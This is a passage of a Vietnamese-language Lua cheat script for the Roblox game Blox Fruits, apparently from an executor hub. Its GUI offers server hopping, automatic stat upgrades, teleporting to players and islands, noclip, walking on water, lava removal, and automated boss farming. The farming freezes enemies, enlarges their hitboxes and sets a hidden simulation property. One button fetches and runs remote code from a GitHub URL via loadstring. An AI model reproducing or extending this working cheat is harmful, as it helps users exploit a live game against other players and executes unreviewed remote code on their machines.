        "Tiền Truy Nã : "..game:GetService("Players").LocalPlayer.leaderstats["Bounty/Honor"].Value.."\n"..
        "Máu: "..game.Players.LocalPlayer.Character.Humanoid.Health.."/"..game.Players.LocalPlayer.Character.Humanoid.MaxHealth.."\n"..
        "Năng Lượng : "..game.Players.LocalPlayer.Character.Energy.Value.."/"..game.Players.LocalPlayer.Character.Energy.MaxValue.."\n"..
        "Tộc : "..game:GetService("Players").LocalPlayer.Data.Race.Value.."\n"..
        "Trái : "..game:GetService("Players").LocalPlayer.Data.DevilFruit.Value.."\n"..
        "━━━━━━━━━━━━━━━━━━━━━"
})
local Time = Tabs.Status:AddParagraph({
    Title="Thời Gian",
    Content=""
})
local function UpdateLocalTime()
    local date = os.date("*t")
    local hour = date.hour % 24
    local ampm = hour<12 and "AM" or "PM"
    local formattedTime = string.format("%02i:%02i:%02i %s", ((hour-1) % 12)+1, date.min, date.sec, ampm)
    local formattedDate = string.format("%02d/%02d/%04d", date.day, date.month, date.year)
    local LocalizationService = game:GetService("LocalizationService")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local name = player.Name
    local regionCode = "Unknown"
    local success, code=pcall(function()
        return LocalizationService:GetCountryRegionForPlayerAsync(player)
    end)
    if success then
        regionCode=code
    end
    Time:SetDesc(formattedDate .. "-" .. formattedTime .. " [ " .. regionCode .. " ]")
end
spawn(function()
    while true do
        UpdateLocalTime()
        game:GetService("RunService").RenderStepped:Wait()
    end
end)
local ServerTime = Tabs.Status:AddParagraph({
    Title="Thời Gian Máy Chủ",
    Content=""
})
local function UpdateServerTime()
    local GameTime = math.floor(workspace.DistributedGameTime+0.5)
    local Hour = math.floor(GameTime/(60^2)) % 24
    local Minute = math.floor(GameTime/60) % 60
    local Second = GameTime % 60
    ServerTime:SetDesc(string.format("%02d Tiếng-%02d Phút-%02d Giây", Hour, Minute, Second))
end
spawn(function()
    while task.wait() do
        pcall(UpdateServerTime)
    end
end)
local FrozenIsland = Tabs.Status:AddParagraph({
    Title="Đảo Leviathan",
    Content=""
})
spawn(function()
pcall(function()
    while wait() do
        if game:GetService("Workspace").Map:FindFirstChild("FrozenDimension") then
            FrozenIsland:SetDesc('✅')
        else
            FrozenIsland:SetDesc('❌')
        end
    end
end)
end)
local Input = Tabs.Status:AddInput("Input", {
        Title="Job ID",
        Default="",
        Placeholder="Dán Job ID Vào Đây",
        Numeric=false, 
        Finished=false, 
        Callback=function(Value)
            _G.Job=Value
        end
    })
    Tabs.Status:AddButton({
        Title="Bắt Đầu Tham Gia Job ID",
        Description="",
        Callback=function()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.placeId,_G.Job, game.Players.LocalPlayer)
        end
    })
    Tabs.Status:AddButton({
        Title="Sao Chép Job ID",
        Description="",
        Callback=function()
            setclipboard(tostring(game.JobId))
        end
    })
    local Toggle = Tabs.Status:AddToggle("MyToggle", {Title="Spam Tham Gia Job ID", Default=false })
    Toggle:OnChanged(function(Value)
  _G.Join=Value
        end)
        spawn(function()
while wait() do
if _G.Join then
game:GetService("TeleportService"):TeleportToPlaceInstance(game.placeId,_G.Job, game.Players.LocalPlayer)
end
end
end)

local Mastery = Tabs.Status:AddSection("Sever")

Tabs.Status:AddButton({
	Title = "Tham Gia Lại Server",
	Description = "",
	Callback = function()
		game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
	end
})

Tabs.Status:AddButton({
	Title = "Tham Gia Server Ít Người V1",
	Description = "",
	Callback = function()
		getgenv().AutoTeleport = true
        getgenv().DontTeleportTheSameNumber = true 
        getgenv().CopytoClipboard = false
        if not game:IsLoaded() then
            print("Game is loading waiting...")
        end
        local maxplayers = math.huge
        local serversmaxplayer;
        local goodserver;
        local gamelink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=1000" 
        function serversearch()
            for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync(gamelink)).data) do
                if type(v) == "table" and v.playing ~= nil and maxplayers > v.playing then
                    serversmaxplayer = v.maxPlayers
                    maxplayers = v.playing
                    goodserver = v.id
                end
            end       
        end
        function getservers()
            serversearch()
            for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync(gamelink))) do
                if i == "nextPageCursor" then
                    if gamelink:find("&ecursor=") then
                        local a = gamelink:find("&ecursor=")
                        local b = gamelink:sub(a)
                        gamelink = gamelink:gsub(b, "")
                    end
                    gamelink = gamelink .. "&ecursor=" ..v
                    getservers()
                end
            end
        end 
        getservers()
        if AutoTeleport then
            if DontTeleportTheSameNumber then 
                if #game:GetService("Players"):GetPlayers() - 4  == maxplayers then
                    return warn("It has same number of players (except you)")
                elseif goodserver == game.JobId then
                    return warn("Your current server is the most empty server atm") 
                end
            end
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, goodserver)
        end
    end
})

Tabs.Status:AddButton({
    Title = "Tham Gia Server Ngẫu Nhiên V2",
    Description = "",
    Callback = function()
        local HttpService = game:GetService("HttpService")
        local TPS = game:GetService("TeleportService")
        
        -- Kiểm tra nếu game có thể gửi request HTTP
        local success, response = pcall(function()
            return game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
        end)

        if not success then
            print("Không thể lấy danh sách server! Hãy kiểm tra HTTP Requests trong cài đặt game.")
            return
        end
        
        local Servers = HttpService:JSONDecode(response).data
        local AvailableServers = {}

        for _, v in pairs(Servers) do
            if v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(AvailableServers, v.id)
            end
        end

        if #AvailableServers > 0 then
            local RandomServer = AvailableServers[math.random(1, #AvailableServers)]
            
            -- Kiểm tra nếu TPS có thể teleport
            local teleportSuccess, teleportError = pcall(function()
                TPS:TeleportToPlaceInstance(game.PlaceId, RandomServer)
            end)

            if not teleportSuccess then
                print("Lỗi Teleport: " .. teleportError)
            end
        else
            print("Không tìm thấy server phù hợp!")
        end
    end
})


Tabs.Status:AddButton({
	Title = "Id Sever",
	Description = "",
	Callback = function()
		Hop()
	end
})

function Hop()
	local PlaceID = game.PlaceId
	local AllIDs = {}
	local foundAnything = ""
	local actualHour = os.date("!*t").hour
	local Deleted = false
	function TPReturner()
		local Site;
		if foundAnything == "" then
			Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
		else
			Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
		end
		local ID = ""
		if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
			foundAnything = Site.nextPageCursor
		end
		local num = 0;
		for i,v in pairs(Site.data) do
			local Possible = true
			ID = tostring(v.id)
			if tonumber(v.maxPlayers) > tonumber(v.playing) then
				for _,Existing in pairs(AllIDs) do
					if num ~= 0 then
						if ID == tostring(Existing) then
							Possible = false
						end
					else
						if tonumber(actualHour) ~= tonumber(Existing) then
							local delFile = pcall(function()
								AllIDs = {}
								table.insert(AllIDs, actualHour)
							end)
						end
					end
					num = num + 1
				end
				if Possible == true then
					table.insert(AllIDs, ID)
					wait()
					pcall(function()
						wait()
						game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
					end)
					wait(4)
				end
			end
		end
	end
	function Teleport() 
		while wait() do
			pcall(function()
				TPReturner()
				if foundAnything ~= "" then
					TPReturner()
				end
			end)
		end
	end
	Teleport()
end      

local DropdownStats = Tabs.Stats:AddDropdown("DropdownStats", {
    Title = "Chọn Giá Trị Chỉ Số",
    Description = "",
    Values = {'1', '50', '100', '2650'},
    Multi = false,
    Default = 1,
})
DropdownStats:SetValue('1')
DropdownStats:OnChanged(function(Value)
    _G.Point = Value
end)
task.spawn(function()
    while wait() do
        pcall(function()
            if _G.Point == "1" then
                -- Xử lý khi chọn 1
            elseif _G.Point == "50" then
                -- Xử lý khi chọn 50
            elseif _G.Point == "100" then
                -- Xử lý khi chọn 100
            elseif _G.Point == "2650" then
                -- Xử lý khi chọn 2650
            end
        end)
    end
end)

local ToggleStats = Tabs.Stats:AddToggle("ToggleStats", {Title="Tự Động Nâng Chỉ Số Đã Nhập",Description="", Default=false })
ToggleStats:OnChanged(function(Value)
    _G.Stats_Kaitun = Value
    end)
Options.ToggleStats:SetValue(false)

spawn(function()
	while wait() do
		pcall(function()
			if _G.Stats_Kaitun then
				if Sea1 then
					local args = {
						[1] = "AddPoint",
						[2] = "Melee",						
						[3] = _G.Point
						}
						
					game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
					
					local args = {
						[1] = "AddPoint",
						[2] = "Defense",						
						[3] = _G.Point
						}
						
					game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
				elseif Sea2 then
					local args = {
						[1] = "AddPoint",
						[2] = "Defense",
						[3] = _G.Point
						}
						
					game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
				end
			end
		end)
	end
end)

local ToggleMelee = Tabs.Stats:AddToggle("ToggleMelee", {Title="Nâng Đấm",Description="", Default=false })
ToggleMelee:OnChanged(function(Value)
    _G.Auto_Stats_Melee=Value
    end)
Options.ToggleMelee:SetValue(false)
local ToggleDe = Tabs.Stats:AddToggle("ToggleDe", {Title="Nâng Máu",Description="", Default=false })
ToggleDe:OnChanged(function(Value)
    _G.Auto_Stats_Defense=Value
    end)
Options.ToggleDe:SetValue(false)
local ToggleSword = Tabs.Stats:AddToggle("ToggleSword", {Title="Nâng Kiếm",Description="", Default=false })
ToggleSword:OnChanged(function(Value)
    _G.Auto_Stats_Sword=Value
    end)
Options.ToggleSword:SetValue(false)
local ToggleGun = Tabs.Stats:AddToggle("ToggleGun", {Title="Nâng Súng", Description="",Default=false })
ToggleGun:OnChanged(function(Value)
    _G.Auto_Stats_Gun=Value
    end)
Options.ToggleGun:SetValue(false)
local ToggleFruit = Tabs.Stats:AddToggle("ToggleFruit", {Title="Nâng Trái",Description="", Default=false })
ToggleFruit:OnChanged(function(Value)
    _G.Auto_Stats_Devil_Fruit=Value
    end)
Options.ToggleFruit:SetValue(false)
spawn(function()
    while wait() do
        if _G.Auto_Stats_Devil_Fruit then
            local args = {
                [1]="AddPoint",
                [2]="Demon Fruit",
                [3]=_G.Point
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Stats_Gun then
            local args = {
                [1]="AddPoint",
                [2]="Gun",
                [3] = _G.Point
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Stats_Sword then
            local args = {
                [1]="AddPoint",
                [2]="Sword",
                [3]= _G.Point
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Stats_Defense then
            local args = {
                [1]="AddPoint",
                [2]="Defense",
                [3] = _G.Point
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Stats_Melee then
            local args = {
                [1]="AddPoint",
                [2]="Melee",
                [3] = _G.Point
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    end
end)
local Playerslist = {}
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    table.insert(Playerslist,v.Name)
end
local SelectedPly = Tabs.Player:AddDropdown("SelectedPly", {
    Title="Chọn Người Chơi",
    Description="",
    Values=Playerslist,
    Multi=false,
    Default=1,
})
SelectedPly:SetValue(_G.SelectPly)
SelectedPly:OnChanged(function(Value)
    _G.SelectPly=Value
end)
Tabs.Player:AddButton({
    Title="Tải Lại Người Chơi",
    Description="",
    Callback=function()
        table.clear(Playerslist)
        for i,v in pairs(game:GetService("Players"):GetChildren()) do
            table.insert(Playerslist,v.Name)
        end
    end
})
local ToggleTeleport = Tabs.Player:AddToggle("ToggleTeleport", {Title="Bay Đến Người Chơi", Description="",Default=false })
ToggleTeleport:OnChanged(function(Value)
    _G.TeleportPly=Value
    if Value==false then
        wait()
        AutoHaki()
        Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
        wait()
    end
end)
Options.ToggleTeleport:SetValue(false)
spawn(function()
    while wait() do
        if _G.TeleportPly then
            pcall(function()
                if game.Players:FindFirstChild(_G.SelectPly) then
                    Tween(game.Players[_G.SelectPly].Character.HumanoidRootPart.CFrame)
                end
            end)
        end
    end
end)


local ToggleNoClip = Tabs.Player:AddToggle("ToggleNoClip", {Title = "Xuyên Tường", Description = "", Default = true })

_G.LOf = true -- Mặc định bật khi chạy script

ToggleNoClip:OnChanged(function(value)
    _G.LOf = value
end)

Options.ToggleNoClip:SetValue(true) -- Đặt toggle thành true khi chạy

spawn(function()
    pcall(function()
        game:GetService("RunService").Stepped:Connect(function()
            if _G.LOf then
                for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false    
                    end
                end
            else
                for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = true  -- Khi tắt, các phần tử có thể va chạm bình thường
                    end
                end
            end
        end)
    end)
end)

local ToggleWalkOnWater = Tabs.Player:AddToggle("ToggleWalkOnWater", {Title = "Đi Trên Nước", Default = true })
ToggleWalkOnWater:OnChanged(function(Value)
    _G.WalkWater = Value
end)
Options.ToggleWalkOnWater:SetValue(true)
 
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.WalkWater then
                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,112,1000)
            else
                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,80,1000)
            end
        end)
    end
end)

-- Tạo Toggle để bật/tắt chức năng xóa dung nham
local ToggleRemoveLava = Tabs.Player:AddToggle("ToggleRemoveLava", {Title = "Xóa Dung Nham", Description = "Vô hiệu hóa hoặc xóa dung nham", Default = false})

ToggleRemoveLava:OnChanged(function(value)
    _G.RemoveLava = value  -- Lưu giá trị toggle
end)

spawn(function()
    while wait(0.1) do
        pcall(function()
            if _G.RemoveLava then
                -- Duyệt qua tất cả các đối tượng trong workspace
                for _, v in pairs(workspace:GetDescendants()) do
                    -- Kiểm tra nếu đối tượng là một BasePart và có tên hoặc đặc điểm nhận diện dung nham
                    if v:IsA("BasePart") and v.Name == "Lava" then
                        -- Xóa dung nham khỏi game
                        v:Destroy()
                        -- Hoặc vô hiệu hóa va chạm với dung nham thay vì xóa
                        -- v.CanCollide = false
                    end
                end
            end
        end)
    end
end)

local ToggleSpeedRun = Tabs.Player:AddToggle("ToggleSpeedRun", {Title = "Run Speed",Description = "Auto Chạy Nhanh", Default = true })
ToggleSpeedRun:OnChanged(function(Value)
    InfAbility = Value
    if Value == false then
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility"):Destroy()
    end
end)
Options.ToggleSpeedRun:SetValue(true)
spawn(function()
    while wait() do
        if InfAbility then
            InfAb()
        end
    end
end)
function InfAb()
    if InfAbility then
        if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
            local inf = Instance.new("ParticleEmitter")
            inf.Acceleration = Vector3.new(0,0,0)
            inf.Archivable = true
            inf.Drag = 30
            inf.EmissionDirection = Enum.NormalId.Top
            inf.Enabled = true
            inf.Lifetime = NumberRange.new(0,0)
            inf.LightInfluence = 0
            inf.LockedToPart = true
            inf.Name = "Agility"
            inf.Rate = 1000
            local numberKeypoints2 = {
                NumberSequenceKeypoint.new(0, 0);
                NumberSequenceKeypoint.new(1, 4); 
            }
            inf.Size = NumberSequence.new(numberKeypoints2)
            inf.RotSpeed = NumberRange.new(9999, 99999)
            inf.Rotation = NumberRange.new(0, 0)
            inf.Speed = NumberRange.new(100, 100)
            inf.SpreadAngle = Vector2.new(0,0,0,0)
            inf.Texture = ""
            inf.VelocityInheritance = 0
            inf.ZOffset = 2
            inf.Transparency = NumberSequence.new(0)
            inf.Color = ColorSequence.new(Color3.fromRGB(0,0,0),Color3.fromRGB(0,0,0))
            inf.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
        end
    else
        if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility"):Destroy()
        end
    end
end	
---Ok
Tabs.Player:AddButton({
    Title = "Bay",
    Description = "Script Bay",
    Callback = function()
    
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhEmTu/R2LXHUB/refs/heads/main/script%20fly.lua"))()

  end
  })
  
local ToggleEnablePvp = Tabs.Player:AddToggle("ToggleEnablePvp", {Title="Bật PVP", Description="",Default=false })
ToggleEnablePvp:OnChanged(function(Value)
  _G.EnabledPvP=Value
end)
Options.ToggleEnablePvp:SetValue(false)
spawn(function()
  pcall(function()
      while wait() do
          if _G.EnabledPvP then
              if game:GetService("Players").LocalPlayer.PlayerGui.Main.PvpDisabled.Visible==true then
                  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")
              end
          end
      end
  end)
end)

-- Thêm các Toggle vào GUI


local Teleport = Tabs.Teleport:AddSection("Thế Giới")
local ToggleAutoSea2 = Tabs.Teleport:AddToggle("ToggleAutoSea2", {
    Title="Nhiệm Vụ Qua Biển 2",
    Description="",
    Default=false
})
ToggleAutoSea2:OnChanged(function(Value)
    _G.Auto_Sea2=Value
end)
Options.ToggleAutoSea2:SetValue(false)
spawn(function()
    while wait() do 
        if _G.Auto_Sea2 then
            pcall(function()
                local MyLevel = game:GetService("Players").LocalPlayer.Data.Level.Value
                if MyLevel>=700 and World1 then
                    if game:GetService("Workspace").Map.Ice.Door.CanCollide==false and game:GetService("Workspace").Map.Ice.Door.Transparency==1 then
                        local CFrame1 = CFrame.new(4849.29883, 5.65138149, 719.611877)
                        repeat 
                            Tween(CFrame1) 
                            wait() 
                        until (CFrame1.Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 or _G.Auto_Sea2==false
                        wait(1.1)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("DressrosaQuestProgress","Detective")
                        wait(0.5)
                        EquipWeapon("Key")
                        repeat 
                            Tween(CFrame.new(1347.7124, 37.3751602,-1325.6488)) 
                            wait() 
                        until (Vector3.new(1347.7124, 37.3751602,-1325.6488)-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 or _G.Auto_Sea2==false
                        wait(0.5)
                    else
                        if game:GetService("Workspace").Map.Ice.Door.CanCollide==false and game:GetService("Workspace").Map.Ice.Door.Transparency==1 then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Ice Admiral") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name=="Ice Admiral" then
                                        if not v.Humanoid.Health<=0 then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                                OldCFrameSecond=v.HumanoidRootPart.CFrame
                                                repeat 
                                                    task.wait(_G.Fast_Delay)
                                                    Click()


AutoHaki()
                                                    EquipWeapon(SelectWeapon)
                                                    v.HumanoidRootPart.CanCollide=false
                                                    v.Humanoid.WalkSpeed=0
                                                    v.Head.CanCollide=false
                                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                                    v.HumanoidRootPart.CFrame=OldCFrameSecond
                                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                                    
                                                    sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius", math.huge)
                                                until not _G.Auto_Sea2 or not v.Parent or v.Humanoid.Health<=0
                                            end
                                        else
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
                                        end
                                    end
                                end
                            else
                                if game:GetService("ReplicatedStorage"):FindFirstChild("Ice Admiral") then
                                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Ice Admiral").HumanoidRootPart.CFrame*Pos)
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)
local ToggleAutoSea3 = Tabs.Teleport:AddToggle("ToggleAutoSea3", {
    Title="Nhiệm Vụ Qua Biển 3",
    Description="",
    Default=false
})
ToggleAutoSea3:OnChanged(function(Value)
    _G.Auto_Sea3=Value
end)
Options.ToggleAutoSea3:SetValue(false)
spawn(function()
    while wait() do
        if _G.AutoSea3 then
            pcall(function()
                if game:GetService("Players").LocalPlayer.Data.Level.Value>=1500 and World2 then
                    _G.AutoLevel=false
                    if game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("ZQuestProgress", "General")==0 then
                        Tween(CFrame.new(-1926.3221435547, 12.819851875305, 1738.3092041016))
                        if (CFrame.new(-1926.3221435547, 12.819851875305, 1738.3092041016).Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                            wait(1.5)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ZQuestProgress", "Begin")
                        end
                        wait(1.8)
                        if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra") then
                            for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name=="rip_indra" then
                                    OldCFrameThird=v.HumanoidRootPart.CFrame
                                    repeat
                                        task.wait(_G.Fast_Delay)
                                        Click()


AutoHaki()
                                        EquipWeapon(SelectWeapon)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                        v.HumanoidRootPart.CFrame=OldCFrameThird
                                        v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                        v.HumanoidRootPart.CanCollide=false
                                        v.Humanoid.WalkSpeed=0
                                        
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
                                    until _G.AutoSea3==false or v.Humanoid.Health<=0 or not v.Parent
                                end
                            end
                        elseif not game:GetService("Workspace").Enemies:FindFirstChild("rip_indra") and (CFrame.new(-26880.93359375, 22.848554611206, 473.18951416016).Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                            Tween(CFrame.new(-26880.93359375, 22.848554611206, 473.18951416016))
                        end
                    end
                end
            end)
        end
    end
end)
Tabs.Teleport:AddButton({
    Title="Biến 1",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelMain")
    end
})
Tabs.Teleport:AddButton({
    Title="Biến 2",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
    end
})
Tabs.Teleport:AddButton({
    Title="Biển 3",
    Description="",
    Callback=function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
    end
})
local Mastery = Tabs.Teleport:AddSection("Đảo")
if Sea1 then
 IslandList={
                "WindMill",
                "Marine",
                "Middle Town",
                "Jungle",
                "Pirate Village",
                "Desert",
                "Snow Island",
                "MarineFord",
                "Colosseum",
                "Sky Island 1",
                "Sky Island 2",
                "Sky Island 3",
                "Prison",
                "Magma Village",
                "Under Water Island",
                "Fountain City",
                "Shank Room",
                "Mob Island",
}
elseif Sea2 then
       IslandList={
        "The Cafe",
        "Frist Spot",
        "Dark Area",
        "Flamingo Mansion",
        "Flamingo Room",
        "Green Zone",
        "Factory",
        "Colossuim",
        "Zombie Island",
        "Two Snow Mountain",
        "Punk Hazard",
        "Cursed Ship",
        "Ice Castle",
        "Forgotten Island",
        "Ussop Island",
        "Mini Sky Island",
       }
elseif Sea3 then
    IslandList={
        "Mansion",
        "Port Town",
        "Great Tree",
        "Castle On The Sea",
        "MiniSky", 
        "Hydra Island",
        "Floating Turtle",
        "Haunted Castle",
        "Ice Cream Island",
        "Peanut Island",
        "Cake Island",
        "Cocoa Island",
        "Candy Island",
        "Tiki Outpost",
       }
    end
local DropdownIsland = Tabs.Teleport:AddDropdown("DropdownIsland",{
    Title="Chọn Đảo",
    Description="",
    Values=IslandList,
    Multi=false,
    Default=1,
})
DropdownIsland:SetValue(_G.SelectIsland)
DropdownIsland:OnChanged(function(Value)
    _G.SelectIsland=Value
end)
Tabs.Teleport:AddButton({
    Title="Bay Đến Đảo",
    Description="",
    Callback=function()
            if _G.SelectIsland=="WindMill" then
                Tween(CFrame.new(979.79895019531, 16.516613006592, 1429.0466308594))
            elseif _G.SelectIsland=="Marine" then
                Tween(CFrame.new(-2566.4296875, 6.8556680679321, 2045.2561035156))
            elseif _G.SelectIsland=="Middle Town" then
                Tween(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094))
            elseif _G.SelectIsland=="Jungle" then
                Tween(CFrame.new(-1612.7957763672, 36.852081298828, 149.12843322754))
            elseif _G.SelectIsland=="Pirate Village" then
                Tween(CFrame.new(-1181.3093261719, 4.7514905929565, 3803.5456542969))
            elseif _G.SelectIsland=="Desert" then
                Tween(CFrame.new(944.15789794922, 20.919729232788, 4373.3002929688))
            elseif _G.SelectIsland=="Snow Island" then
                Tween(CFrame.new(1347.8067626953, 104.66806030273,-1319.7370605469))
            elseif _G.SelectIsland=="MarineFord" then
                Tween(CFrame.new(-4914.8212890625, 50.963626861572, 4281.0278320313))
            elseif _G.SelectIsland=="Colosseum" then
                Tween( CFrame.new(-1427.6203613281, 7.2881078720093,-2792.7722167969))
            elseif _G.SelectIsland=="Sky Island 1" then
                Tween(CFrame.new(-4869.1025390625, 733.46051025391,-2667.0180664063))
            elseif _G.SelectIsland=="Sky Island 2" then  
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248,-1667.55688))
            elseif _G.SelectIsland=="Sky Island 3" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7894.6176757813, 5547.1416015625,-380.29119873047))
            elseif _G.SelectIsland=="Prison" then
                Tween( CFrame.new(4875.330078125, 5.6519818305969, 734.85021972656))
            elseif _G.SelectIsland=="Magma Village" then
                Tween(CFrame.new(-5247.7163085938, 12.883934020996, 8504.96875))
            elseif _G.SelectIsland=="Under Water Island" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
            elseif _G.SelectIsland=="Fountain City" then
                Tween(CFrame.new(5127.1284179688, 59.501365661621, 4105.4458007813))
            elseif _G.SelectIsland=="Shank Room" then
                Tween(CFrame.new(-1442.16553, 29.8788261,-28.3547478))
            elseif _G.SelectIsland=="Mob Island" then
                Tween(CFrame.new(-2850.20068, 7.39224768, 5354.99268))
            elseif _G.SelectIsland=="The Cafe" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-281.93707275390625, 306.130615234375, 609.280029296875))
                wait()
                Tween(CFrame.new(-380.47927856445, 77.220390319824, 255.82550048828))
            elseif _G.SelectIsland=="Frist Spot" then
                Tween(CFrame.new(-11.311455726624, 29.276733398438, 2771.5224609375))
            elseif _G.SelectIsland=="Dark Area" then
                Tween(CFrame.new(3780.0302734375, 22.652164459229,-3498.5859375))
            elseif _G.SelectIsland=="Flamingo Mansion" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-281.93707275390625, 306.130615234375, 609.280029296875))
            elseif _G.SelectIsland=="Flamingo Room" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(2284.912109375, 15.152034759521484, 905.48291015625))
            elseif _G.SelectIsland=="Green Zone" then
                Tween( CFrame.new(-2448.5300292969, 73.016105651855,-3210.6306152344))
            elseif _G.SelectIsland=="Factory" then
                Tween(CFrame.new(424.12698364258, 211.16171264648,-427.54049682617))
            elseif _G.SelectIsland=="Colossuim" then
                Tween( CFrame.new(-1503.6224365234, 219.7956237793, 1369.3101806641))
            elseif _G.SelectIsland=="Zombie Island" then
                Tween(CFrame.new(-5622.033203125, 492.19604492188,-781.78552246094))
            elseif _G.SelectIsland=="Two Snow Mountain" then
                Tween(CFrame.new(753.14288330078, 408.23559570313,-5274.6147460938))
            elseif _G.SelectIsland=="Punk Hazard" then
                Tween(CFrame.new(-6127.654296875, 15.951762199402,-5040.2861328125))
            elseif _G.SelectIsland=="Cursed Ship" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.40197753906, 125.05712890625, 32885.875))
            elseif _G.SelectIsland=="Ice Castle" then
                Tween(CFrame.new(6148.4116210938, 294.38687133789,-6741.1166992188))
            elseif _G.SelectIsland=="Forgotten Island" then
                Tween(CFrame.new(-3032.7641601563, 317.89672851563,-10075.373046875))
            elseif _G.SelectIsland=="Ussop Island" then
                Tween(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781))
            elseif _G.SelectIsland=="Mini Sky Island" then
                Tween(CFrame.new(-288.74060058594, 49326.31640625,-35248.59375))
            elseif _G.SelectIsland=="Great Tree" then
                Tween(CFrame.new(2681.2736816406, 1682.8092041016,-7190.9853515625))
            elseif _G.SelectIsland=="Castle On The Sea" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-5075.50927734375, 314.5155029296875,-3150.0224609375))
            elseif _G.SelectIsland=="MiniSky" then
                Tween(CFrame.new(-260.65557861328, 49325.8046875,-35253.5703125))
